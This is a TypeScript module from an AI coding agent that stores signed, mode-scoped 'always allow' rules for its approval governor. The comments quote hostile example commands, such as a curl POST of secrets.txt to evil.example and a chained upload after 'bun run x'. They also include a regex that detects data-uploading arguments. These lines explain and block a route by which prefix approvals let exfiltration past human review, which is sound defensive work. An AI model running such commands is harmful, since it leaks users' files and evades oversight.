import { createHmac, timingSafeEqual } from 'node:crypto'
import { existsSync, mkdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { homedir } from 'node:os'
import { dirname, join } from 'node:path'
import type { ActionAssessment, ActionRequest } from './governor.ts'
import { userPreauthSecret } from './preauth.ts'
import { activeMode, AGENT_MODES, type AgentMode } from './mode.ts'
import { noteCorruptState } from '../localJson.ts'

/** The modes a stored `mode` tag may name. Anything else is a malformed rule. */
const KNOWN_MODES = new Set<string>(AGENT_MODES)

/**
 * A persistent "always allow" list — the counterpart to `.elia/policy.json`.
 *
 * `policy.json` can only ever *tighten* the governor. This store is the other
 * direction: it records a human's explicit "yes, and stop asking me" for a class
 * of action, so the supervised approval prompt does not reappear every turn.
 *
 * Two scopes, mirroring what a person actually means when they click that:
 *   - `project` → `.elia/allow.json`, versioned with the repo (a team decision)
 *   - `global`  → `~/.config/elia/allow.json`, this machine only (a personal
 *     habit, alongside the preauth trust stores)
 *
 * A rule is deliberately narrow. For `run_command` it is keyed to the leading
 * token of the command (`git`, `npm`, `New-Item`) — approving `git status` once
 * does not wave through `git push`. For every other tool it is keyed to the tool
 * name plus the governor's `intent`, so "always allow edit_file" cannot silently
 * also mean "always allow github.push".
 *
 * The per-user store is signed. Its rules are exactly the standing authority
 * that lets a later run skip an approval, so an unsigned or edited file is
 * refused rather than honored: the `mac` is an HMAC-SHA256 over the rules array
 * keyed by the same per-user secret that signs pre-authorizations
 * (preauth.ts), which only this machine's own `--authorize`/approval flow can
 * produce. That is what makes the governor's "parent-signs-the-child" boundary
 * real for this store: a shell mishap, a dropped-in repo, or anyone else who
 * can write the file cannot grant themselves a permanent bypass. The
 * checked-in project file stays unsigned by design — it is a reviewed team
 * decision, and policy.json's invariant is that a repo may only ever tighten
 * governance, never hand out standing approvals.
 */
export interface AllowRule {
  /** Tool name: `run_command`, `edit_file`, `github`, … */
  tool: string
  /** For command tools: the leading executable token this rule covers. */
  commandPrefix?: string
  /** Governor intent (`edit_file.write`, `github.push`) — narrows non-command tools. */
  intent?: string
  /**
   * Restricts the rule to one mode, checked against the mode the turn is
   * actually running as. Absent means every mode, which is the right default for
   * a rule a person wrote by hand or the approval flow persisted — "always allow
   * `git status`" is not a security-scoped statement.
   *
   * `/scope all` sets this to `cyber`. Its grants are standing permission to run
   * installs, probes, and reads that only make sense inside a security run, and
   * a permission scoped to that run has to stop when the run stops. Without the
   * field, `/scope all` quietly widened dev too: the intents it grants are
   * cyber-shaped, but the *store* was not, so the same command in a dev turn
   * rode in on a grant given to a CTF.
   */
  mode?: AgentMode
  /** ISO timestamp the rule was added. */
  addedAt: string
  /** Free-text note (the assessment reason at the time), for humans reading the file. */
  note?: string
}

export type AllowScope = 'project' | 'global'

interface AllowFile {
  rules: AllowRule[]
  /** HMAC-SHA256 over the rules array with the per-user preauth secret — an
   * allow file a repo (or a shell mishap) can write is verified, not trusted. */
  mac?: string
}

const MAX_RULES = 500

export function allowPath(scope: AllowScope, cwd = process.cwd()): string {
  if (scope === 'project') return join(cwd, '.elia', 'allow.json')
  // The per-user store lives under ~/.config/elia (the same home the preauth
  // trust stores relocated to), never inside a checked-out repo's `.elia`.
  // Tests isolate this with ELIA_ALLOW_GLOBAL_PATH — and on win32,
  // os.homedir() reads %USERPROFILE%, not $HOME, so the usual "just set
  // $HOME" trick silently does nothing there.
  return process.env.ELIA_ALLOW_GLOBAL_PATH || join(homedir(), '.config', 'elia', 'allow.json')
}

/**
 * The pre-relocation location (~/.elia/allow.json); read once to migrate.
 * ELIA_ALLOW_LEGACY_PATH is the test seam for that (mirroring
 * preauth.ts): with ELIA_ALLOW_GLOBAL_PATH set, a test must never consume —
 * let alone delete — the real machine's ~/.elia/allow.json.
 */
function legacyGlobalAllowPath(): string {
  return process.env.ELIA_ALLOW_LEGACY_PATH ?? join(homedir(), '.elia', 'allow.json')
}

/** True when a legacy ~/.elia/allow.json may be migrated into the active one. */
function legacyMigrationAllowed(): boolean {
  return !process.env.ELIA_ALLOW_GLOBAL_PATH || process.env.ELIA_ALLOW_LEGACY_PATH !== undefined
}

function signRules(rules: AllowRule[]): string {
  return createHmac('sha256', userPreauthSecret()).update(JSON.stringify(rules)).digest('hex')
}

function verifies(file: AllowFile): boolean {
  if (typeof file.mac !== 'string' || file.mac.length === 0) return false
  const expected = signRules(file.rules)
  try {
    return timingSafeEqual(Buffer.from(file.mac, 'hex'), Buffer.from(expected, 'hex'))
  } catch {
    return false
  }
}

interface Cached {
  mtimeMs: number
  file: AllowFile
}
const cache = new Map<string, Cached>()
const EMPTY: AllowFile = { rules: [] }

function load(path: string): AllowFile {
  // One-time migration: a pre-relocation ~/.elia/allow.json predates signing;
  // it was written by this machine's own earlier elia, so carry the rules
  // across once — as a freshly signed store — rather than silently dropping
  // the operator's standing approvals.
  if (path === allowPath('global', process.cwd()) && !existsSync(path)) {
    const legacy = legacyGlobalAllowPath()
    if (legacy && legacy !== path && legacyMigrationAllowed() && existsSync(legacy)) {
      try {
        mkdirSync(dirname(path), { recursive: true, mode: 0o700 })
        const rules = readLegacyRules(legacy)
        writeFileSync(path, `${JSON.stringify({ rules, mac: signRules(rules) }, null, 2)}\n`, { mode: 0o600 })
        rmSync(legacy, { force: true })
      } catch {
        /* migration is best effort; the store just starts empty */
      }
    }
  }
  if (!existsSync(path)) {
    cache.delete(path)
    return EMPTY
  }
  let mtimeMs = 0
  try {
    mtimeMs = statSync(path).mtimeMs
  } catch {
    return EMPTY
  }
  const hit = cache.get(path)
  if (hit && hit.mtimeMs === mtimeMs) return hit.file
  let file: AllowFile = EMPTY
  try {
    const parsed = JSON.parse(readFileSync(path, 'utf8')) as unknown
    if (parsed && typeof parsed === 'object' && Array.isArray((parsed as AllowFile).rules)) {
      const raw = parsed as AllowFile
      // The per-user global store must verify; the checked-in project store is
      // a deliberate, reviewed team file and stays unsigned by design.
      if (path === allowPath('global', process.cwd()) && !verifies(raw)) {
        noteCorruptState('allowStore.verify', path, new Error('allow.json failed its HMAC verification — refusing the rules'), { keepCopy: true })
        file = EMPTY
      } else {
        file = {
          rules: raw.rules
            .filter((r): r is AllowRule => {
              if (!r || typeof r.tool !== 'string') return false
              // A `mode` outside the known set is dropped rather than treated as
              // absent. An unrecognized tag cannot be matched against a running
              // mode, and quietly reading it as "no mode" would widen a
              // cyber-scoped grant to every mode.
              return r.mode === undefined || KNOWN_MODES.has(r.mode)
            })
            .slice(0, MAX_RULES),
        }
      }
    }
  } catch (error) {
    // A malformed allow.json loosens nothing — treat it as empty rather than
    // throw, but say so: otherwise the person's rules just stop applying.
    noteCorruptState('allowStore.read', path, error, { keepCopy: true })
    file = EMPTY
  }
  cache.set(path, { mtimeMs, file })
  return file
}

/** Rules from a pre-signing allow.json, coerced to its shape without a mac. */
function readLegacyRules(path: string): AllowRule[] {
  const parsed = JSON.parse(readFileSync(path, 'utf8')) as unknown
  if (!parsed || typeof parsed !== 'object' || !Array.isArray((parsed as AllowFile).rules)) return []
  return (parsed as AllowFile).rules
    .filter((r): r is AllowRule => Boolean(r) && typeof r.tool === 'string')
    .slice(0, MAX_RULES)
}

/**
 * Shell control syntax that lets one command chain onto another (`bun run x &
 * curl …`), pipe into an interpreter, redirect files, or substitute output.
 * A rule keyed to the leading token must never come to cover those.
 */
const COMMAND_CHAIN_SYNTAX = /[;&|<>`$]|\$\(/i

/**
 * Intents a *prefix* rule may never cover, however the rule was written.
 *
 * A prefix rule is keyed to the leading token, so it stands for "this program
 * is fine" — a judgement about the program, not about the one line the approver
 * happened to see. That reading is safe for `git status` or `npm test` and
 * catastrophic for the network and secret-reading programs below, where the
 * same token spans "fetch a public page" and "upload a local file to a host I
 * choose". A `curl` rule is the sharp case: `curl https://example.com` and
 * `curl -X POST https://evil.example/hook -d @secrets.txt` share a leading
 * token, so the rule silently covered exfiltration of the user's own files,
 * and the governor's correct `shell.sensitive-read` verdict was overridden by
 * the allowlist without a prompt.
 *
 * These stay reachable by an *intent* rule (`/scope all` writes one, and only
 * after a human asked for the class) and by preauth, which is keyed by intent
 * and recorded before a run starts. What is refused here is the narrow,
 * easily-minted `commandPrefix` grant standing in for a category decision.
 *
 * The first two are argument-dependent: `curl https://example.com` and
 * `npm test` stay covered, because there is a shape of the command that carries
 * no risk. The rest are unconditional. Installing a package runs that package's
 * lifecycle scripts, and reaching a container or host runs code somewhere the
 * governor cannot see, so no argument shape makes `npm install left-pad` or
 * `docker exec` a thing a leading token can be read as approving. The governor
 * already says so: these carry a dedicated critical intent because "no settled
 * sibling may ever cover commander", and a persisted prefix rule is such a
 * sibling.
 */
const PREFIX_NEVER_COVERS: ReadonlySet<string> = new Set([
  'shell.external-write',
  'shell.sensitive-read',
  'shell.code-exec',
  'shell.remote',
  'shell.composed',
])

/**
 * Whether a network command's *arguments* are inert enough to be covered by a
 * leading-token rule — a plain read, with nothing bound for the wire.
 * Deliberately self-contained rather than reusing the governor's matchers: this
 * is the trust store's own question ("would a `curl` approval have covered this
 * line?"), and the two answers can legitimately differ.
 *
 * Fails closed. Anything that binds a body, selects a non-GET method, or names a
 * payload file is not safe, because the leading token cannot be read as approval
 * for it. A bare `curl <url>` stays covered, which is what makes a `curl` rule
 * useful for the fetching it was granted for. A secret read needs no such check:
 * it arrives as `shell.sensitive-read` and is refused above regardless.
 */
const TRANSPORT_BOUND_ARGUMENT =
  /(?:\s-X\s*(?:POST|PUT|PATCH|DELETE)|\s--(?:data|data-raw|data-binary|data-urlencode|form|form-string|upload-file|post-file|post-data|body-data|request|json)(?:=|\s)|-d\s|\s--?(?:[a-zA-Z]*[FT])\s|\s-[a-zA-Z]*[FT]\b)/i

function prefixArgumentsAreSafe(command: string, intent: string): boolean {
  // Only `shell.external-write` is decided by the shape of the arguments, since
  // that is the one class where a harmless line exists ("fetch this page") and a
  // harmful one does not ("upload this file"). Every other class here is refused
  // outright: a secret read has already been identified as such, and installing
  // code, entering a container or reaching a host has no harmless argument shape
  // for a leading token to stand in for.
  if (intent !== 'shell.external-write') return false
  return !TRANSPORT_BOUND_ARGUMENT.test(command)
}

/**
 * Whether approving this request can be persisted as a standing *prefix* rule.
 * A `run_command` rule is keyed to the leading token only, so persisting one for
 * a command that chains further work behind shell control syntax (`&`, `;`, `|`,
 * redirects, `$`, command substitution) would auto-allow a much wider class than
 * the approver actually saw — a single `bun` approval would come to cover
 * `bun run x & curl -X POST example.com -d @secrets.txt`, and `git` would come
 * to cover `git push --force origin main`. Such approvals are honored for the
 * session/run only and never persisted.
 */
export function canPersistPrefixRule(request: ActionRequest): boolean {
  const command = shellCommandOf(request)
  return command === undefined || !COMMAND_CHAIN_SYNTAX.test(command)
}

/**
 * The shell command line a request runs, for the tools whose rules are keyed to
 * its leading token: run_command, and `process start`, which runs the same kind
 * of command without waiting for it. Undefined for every other request — a
 * `process` rule keyed to an intent like `shell.unknown` would auto-allow every
 * command the governor doesn't recognise.
 */
function shellCommandOf(request: ActionRequest): string | undefined {
  if (request.name !== 'run_command' && !(request.name === 'process' && request.input.action === 'start')) return undefined
  return typeof request.input.command === 'string' ? request.input.command : ''
}

/** The leading token of a shell command — `git push --force` → `git`. */
export function commandPrefix(command: string): string {
  const trimmed = command.trim().replace(/^[(!{]\s*/, '')
  const first = trimmed.split(/[\s;|&]+/, 1)[0]!
  // Keep a path-qualified binary readable: ./gradlew → gradlew, C:\x\node.exe → node.exe
  return first.replace(/\\/g, '/').split('/').filter(Boolean).pop() ?? first
}

/** A direct program's executable plus its first operation-defining argument. */
function directProgramPrefix(input: Record<string, unknown>): string {
  const program = typeof input.program === 'string' ? commandPrefix(input.program) : ''
  const firstArg = Array.isArray(input.args) && typeof input.args[0] === 'string' ? input.args[0].trim() : ''
  return [program, firstArg].filter(Boolean).join(' ')
}

function matches(rule: AllowRule, request: ActionRequest, assessment: ActionAssessment): boolean {
  // A mode-scoped rule is authority given for one mode and no other. Checked
  // first so a cyber-scoped grant can never be read as a general one, whatever
  // the tool and intent below would have matched.
  if (rule.mode !== undefined && rule.mode !== activeMode()) return false
  // "Always allow changes to elia's own source" means every file tool, not only
  // the one that happened to ask.
  if (rule.intent === 'self_edit') return assessment.intent === 'self_edit'
  if (rule.tool !== request.name) return false
  const command = shellCommandOf(request)
  if (command !== undefined) {
    // A persisted prefix rule was approved for a single leading token. A
    // command that chains further work behind shell control syntax reaches
    // far beyond that token (`bun` must not cover `bun run x & curl … -d
    // @secrets.txt`, `git` must not cover `git reset --hard; git push --force`),
    // so it must never ride in on a prefix rule — prompt instead.
    if (COMMAND_CHAIN_SYNTAX.test(command)) return false
    // A prefix rule stands for the leading token, never for the arguments. For a
    // program whose arguments decide whether data leaves the machine, the token
    // alone is not the decision, so the arguments have to be safe *too* (see
    // PREFIX_NEVER_COVERS). Checked before the intent-rule branch, which may
    // cover these classes on purpose.
    if (rule.commandPrefix && PREFIX_NEVER_COVERS.has(assessment.intent) && !prefixArgumentsAreSafe(command, assessment.intent)) return false
    // An intent-only rule is a broader grant that the caller had to ask for
    // explicitly: `/scope all` writes one for the shell families a security run
    // needs, so a single approval covers `apt install gdb`, `apt install
    // radare2` and `sudo apt install python3-pip` instead of demanding a
    // separate "yes" per package.
    //
    // The chain guard above still runs first and is not bypassed by this: an
    // intent rule widens *which commands of a class* are allowed, never what a
    // command may chain onto. `shell.sensitive-read` rules are the sharp edge
    // here, and they are written by `/scope all` for a run the user started,
    // never inferred from a prefix somebody happened to approve earlier.
    if (!rule.commandPrefix && rule.intent) return rule.intent === assessment.intent
    return Boolean(rule.commandPrefix) && commandPrefix(command) === rule.commandPrefix
  }
  if (request.name === 'run_program') {
    const prefix = directProgramPrefix(request.input)
    const prefixMatches = Boolean(rule.commandPrefix) && prefix === rule.commandPrefix
    if (!prefixMatches) return false
    // Same reasoning as the shell branch: the two-token prefix is still a prefix,
    // so it may not carry a class the approver never agreed to.
    if (PREFIX_NEVER_COVERS.has(assessment.intent)) return false
    return !rule.intent || rule.intent === assessment.intent
  }
  return !rule.intent || rule.intent === assessment.intent
}

/** True when a persisted rule (project or global) already permits this action. */
export function isAllowlisted(request: ActionRequest, assessment: ActionAssessment, cwd = process.cwd()): boolean {
  const rules = [...load(allowPath('project', cwd)).rules, ...load(allowPath('global', cwd)).rules]
  return rules.some((rule) => matches(rule, request, assessment))
}

/** Builds the rule an approval prompt would persist for this request. */
export function ruleFor(request: ActionRequest, assessment: ActionAssessment): AllowRule {
  const base: AllowRule = { tool: request.name, addedAt: new Date().toISOString(), note: assessment.reason }
  const command = shellCommandOf(request)
  if (command !== undefined) return { ...base, commandPrefix: commandPrefix(command) }
  if (request.name === 'run_program') return { ...base, commandPrefix: directProgramPrefix(request.input), intent: assessment.intent }
  return { ...base, intent: assessment.intent }
}

/** A short human label for what a rule covers — for the approval menu. */
export function ruleLabel(rule: AllowRule): string {
  if (rule.commandPrefix) return `\`${rule.commandPrefix}\` commands`
  if (rule.intent === 'self_edit') return "changes to elia's own source"
  return `\`${rule.tool}\``
}

/**
 * Rule identity: what it covers, and which mode it was given for.
 *
 * `mode` belongs in here because a cyber-scoped grant and an unscoped one for
 * the same intent are genuinely different permissions. Collapsing them would
 * mean `/scope clear` deletes a hand-written rule the operator never asked it to
 * touch, and `/scope all` could report a grant already present when the standing
 * mode-agnostic one it found is not the one it wrote.
 */
function isSameRule(a: AllowRule, b: AllowRule): boolean {
  return a.tool === b.tool && a.commandPrefix === b.commandPrefix && a.intent === b.intent && a.mode === b.mode
}

export function addAllowRule(rule: AllowRule, scope: AllowScope, cwd = process.cwd()): void {
  const path = allowPath(scope, cwd)
  const file = load(path)
  const duplicate = file.rules.some((r) => isSameRule(r, rule))
  const rules: AllowRule[] = duplicate ? file.rules : [...file.rules, rule].slice(-MAX_RULES)
  const next: AllowFile = scope === 'global' ? { rules, mac: signRules(rules) } : { rules }
  mkdirSync(dirname(path), { recursive: true, mode: 0o700 })
  writeFileSync(path, `${JSON.stringify(next, null, 2)}\n`, { mode: 0o600 })
  cache.delete(path)
}

/**
 * Drop every rule matching `rule`'s identity, returning how many were removed.
 *
 * A grant that cannot be taken back is a grant nobody can decline: `/scope all`
 * is a standing yes, and the way a person revokes one has to be a command, not
 * an editor and a signed file. Identity is the same triple `addAllowRule` uses
 * to decide a rule is a duplicate, so re-adding after a removal is clean.
 */
export function removeAllowRule(rule: AllowRule, scope: AllowScope, cwd = process.cwd()): number {
  const path = allowPath(scope, cwd)
  const file = load(path)
  const rules = file.rules.filter((r) => !isSameRule(r, rule))
  const removed = file.rules.length - rules.length
  if (removed === 0) return 0
  const next: AllowFile = scope === 'global' ? { rules, mac: signRules(rules) } : { rules }
  mkdirSync(dirname(path), { recursive: true, mode: 0o700 })
  writeFileSync(path, `${JSON.stringify(next, null, 2)}\n`, { mode: 0o600 })
  cache.delete(path)
  return removed
}

/** Test seam. */
export function clearAllowCache(): void {
  cache.clear()
}
